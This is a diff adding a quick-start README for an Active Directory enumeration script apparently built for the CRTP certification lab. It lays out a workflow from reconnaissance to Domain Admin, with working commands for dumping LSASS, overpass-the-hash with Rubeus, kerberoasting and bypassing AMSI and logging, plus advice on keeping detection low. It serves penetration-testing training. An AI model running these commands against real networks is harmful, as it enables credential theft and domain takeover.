@@ -1,0 +1,164 @@
+================================================================
+ CRTP EXAM - START HERE  (quick launch sequence)
+ Authorized CRTP lab / your own AD only.
+================================================================
+
+------------------------------------------------
+NOISE POSTURE (read this)
+------------------------------------------------
+DEFAULT = QUIET. Only LDAP + local checks run. This looks like normal AD
+traffic and does NOT connect to other computers.
+
+LOUD sweeps (local-admin / shares / session-hunt) fan out to EVERY host and
+are OFF by default. Turn them on only when you accept the noise:
+    -HostSweep            run them domain-wide (loudest)
+    -Target <host>        run them against just that box (quiet-ish, per-hop)
+
+Compiled/active tools are also opt-in and louder: -Roast (Rubeus, 4769 events),
+-BloodHound (SharpHound), -SharpEnum (ADCollector/Seatbelt/SharpUp), -WinPEASPath.
+
+NOTE ON AMSI: this .ps1 contains tool names/commands (mimikatz, kerberoast,
+dcsync, Rubeus...) that Defender/AMSI may flag when you LOAD it. Load it inside
+an InviShell shell (or after your AMSI bypass), same as your other .ps1 tools.
+
+------------------------------------------------
+OPTION A - Zero setup, QUIET (just want the data)
+------------------------------------------------
+Invoke-CRTPEnum.ps1 needs NOTHING else. Pure LDAP fallback.
+Two ways to run it - both work:
+
+  1) DIRECT (simplest):
+       powershell -ep bypass -File .\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
+     or from inside a PS prompt:
+       .\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
+
+  2) DOT-SOURCE (lets you call it repeatedly + use loaded modules):
+       . .\Invoke-CRTPEnum.ps1
+       Invoke-CRTPEnum -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
+
+All flags below work in BOTH forms, e.g.:
+       .\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -Target dcorp-appsrv -HostSweep
+
+Then read, in this order:
+    C:\Users\Public\loot\CRTPEnum_*\00_SUMMARY.txt        (ranked findings)
+    C:\Users\Public\loot\CRTPEnum_*\EXPLOIT_COMMANDS.txt  (command per finding)
+    C:\Users\Public\loot\CRTPEnum_*\CRTP-Playbook.txt     (phase 0-8 whole-exam guide)
+    C:\Users\Public\loot\CRTPEnum_*\00_SUMMARY.html       (for the report)
+
+------------------------------------------------
+OPTION B - Operational (InviShell handles logging/AMSI, not the script)
+------------------------------------------------
+InviShell is the CRTP-sanctioned way to run under logging/AMSI coverage.
+Keep the recon tool clean; let InviShell own the environment.
+
+ 1) Launch a shell through InviShell (no admin needed):
+        D:\CRTP\Tools\InviShell\RunWithRegistryNonAdmin.bat
+    (it auto-removes its registry key on exit)
+
+ 2) (Optional) AMSI + logging bypass for loading OTHER modules:
+        run Amsi-Byp.txt  and  sbloggingbypass.txt
+
+ 3) (Optional) load real AD cmdlets WITHOUT RSAT, and PowerView etc:
+        Import-Module D:\CRTP\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+        Import-Module D:\CRTP\Tools\PowerView.ps1
+        Import-Module D:\CRTP\Tools\PowerUp.ps1
+        . D:\CRTP\Tools\Invoke-SessionHunter.ps1
+
+ 4) Run the enum (auto-uses whatever you loaded, else pure LDAP):
+        . .\Invoke-CRTPEnum.ps1
+        Invoke-CRTPEnum -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
+
+------------------------------------------------
+WORKFLOW LOOP (repeat after every new foothold)
+------------------------------------------------
+ 1) Invoke-CRTPEnum  -> read 00_SUMMARY.txt HIGH lines
+ 2) open EXPLOIT_COMMANDS.txt -> copy the command for that finding
+ 3) fill the <placeholders> (cracked hash, wordlist, DC name, cert pass)
+ 4) run it with YOUR tools (Rubeus / Certify / Invoke-Mimi / minidumpdotnet)
+ 5) new creds/host -> re-run Invoke-CRTPEnum from there
+ 6) _MASTER_findings.txt keeps the running log across all runs
+
+------------------------------------------------
+AFTER LOCAL PRIVESC (became local admin / SYSTEM on a box)
+------------------------------------------------
+ 1) Re-run scoped to THIS box - your token changed:
+        .\Invoke-CRTPEnum.ps1 -Domain <dom> -Target <thisbox> -HostSweep
+    - sec 00 confirms new privs (SeDebug/SeImpersonate now enabled)
+    - sec 14 shows if a privileged user is logged on HERE
+    - EXPLOIT_COMMANDS.txt gives the LSASS-dump line
+
+ 2) Dump creds on the box (admin/SeDebug):
+        FindLSASSPID.exe ; minidumpdotnet.exe <lsass-pid> C:\Users\Public\lsass.dmp
+    (or SafetyKatz)  -> you now hold another user's hash/ticket
+
+ 3) Become that new identity (THE key step), pick one:
+        runas /netonly /user:<dom>\<user> powershell            (have password)
+        Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt         (overpass-the-hash)
+
+ 4) Re-enumerate AS that identity:
+        # option A - in the runas/PTT shell, just run it (inherits the context):
+            .\Invoke-CRTPEnum.ps1 -Domain <dom> -HostSweep
+        # option B - no shell needed, hand creds to the LDAP engine:
+            $sec = ConvertTo-SecureString '<pass>' -AsPlainText -Force
+            $cred = New-Object System.Management.Automation.PSCredential('<dom>\<user>',$sec)
+            .\Invoke-CRTPEnum.ps1 -Domain <dom> -Credential $cred
+
+ 5) New findings -> new hops. Repeat until a path reaches DA/EA.
+    _MASTER_findings.txt accumulates everything across identities.
+
+ NOTE: -Credential drives the built-in LDAP engine (directory data as that user).
+ PowerView / host-sweep / local sections still use the CURRENT process token, so
+ for those "as another user", use the runas/netonly or PTT shell (option A).
+
+------------------------------------------------
+FLAGS
+------------------------------------------------
+ -Domain <fqdn>        target domain (default: current)
+ -OutDir <path>        where reports go (use a writable path on a foothold)
+ -Quick                skip slow ACL / local-admin / share / session sweeps
+ -IncludeForest        also recon trusted domains
+ -ADModulePath <dll>   explicit path to Microsoft.ActiveDirectory.Management.dll
+ -Target <host,host>   scope host sections (computers/shares/sessions) to those
+                       boxes - use on each new foothold for a fast re-run
+ -WinPEASPath <exe>    OPT-IN: run winPEAS for deep LOCAL triage on this host.
+                       Loud + AV-signatured; run deliberately, not every sweep.
+                       Output -> 13b_winpeas.txt. Overlaps section 13 (PowerUp).
+ -SQLCrawl             OPT-IN: PowerUpSQL MSSQL discovery + link crawl (sec 18).
+                       Needs PowerUpSQL loaded. The dcorp-mssql -> eu-sql path.
+ -BloodHound           OPT-IN: SharpHound DCOnly collection -> zip for BloodHound (sec 19).
+ -SharpHoundPath <p>   path to SharpHound.ps1 OR .exe. Auto-found in Sliver\ if omitted.
+ -Roast                OPT-IN: run Rubeus kerberoast + asreproast, save hashes (sec 20).
+                       Generates Kerberos 4769 events - opt-in, not every sweep.
+ -RubeusPath <exe>     path to Rubeus.exe. Auto-found in Sliver\ if omitted.
+ -SharpEnum            OPT-IN: run compiled .NET ENUM binaries from -ToolsDir:
+                       ADCollector (AD recon), Seatbelt (host), SharpUp (privesc).
+                       Compiled + AV-signatured - opt-in, run under bypass coverage.
+ -ToolsDir <path>      folder with the compiled tools (default D:\CRTP\Tools\Sliver).
+ -Credential <cred>    enumerate AS a captured user via the LDAP engine (no shell).
+                       $c=New-Object Management.Automation.PSCredential('dom\user',$sec)
+ -Only <keywords>      run ONLY the matching sections (comma list). Default: all.
+ -Skip <keywords>      skip matching sections. -Skip beats -Only.
+   Section keywords: context token | domain trust forest | users kerberoast asrep
+   delegation secrets | computers rbcd maq | groups | gpo cpassword | adcs esc |
+   policy spray | dcsync | laps | acls | spns | mssql | privesc local | gmsa
+   Examples:
+     .\Invoke-CRTPEnum.ps1 -Domain <d> -Only kerberoast,asrep,acls   (just roast+ACL leads)
+     .\Invoke-CRTPEnum.ps1 -Domain <d> -Skip gpo,spns                (everything except those)
+
+TOOLS NOW IN YOUR FOLDER (auto-detected):
+   Rubeus.exe      D:\CRTP\Tools\Sliver\Rubeus.exe      (-Roast)
+   SharpHound.exe  D:\CRTP\Tools\Sliver\SharpHound.exe  (-BloodHound)
+   PowerUpSQL      Import-Module D:\CRTP\Tools\PowerUpSQL-master\PowerUpSQL.psd1  (-SQLCrawl)
+
+FULL COVERAGE, LOW NOISE (load PowerView first for sec 16/17):
+    Invoke-CRTPEnum -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
+FULL COVERAGE + graph + SQL + roast (louder, do once when you want everything):
+    Invoke-CRTPEnum -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot `
+        -SQLCrawl -BloodHound -SharpHoundPath D:\CRTP\Tools\SharpHound.ps1 `
+        -Roast -RubeusPath D:\CRTP\Tools\Rubeus.exe
+
+FAST PER-HOP RE-RUN (after landing on a new box):
+    Invoke-CRTPEnum -Domain dollarcorp.moneycorp.local -Target <new-host> -Quick
+
+NOTE: the script is READ-ONLY. It locates targets and writes the commands;
+YOU pull the trigger on the exploitation tools. Safe to re-run any time.
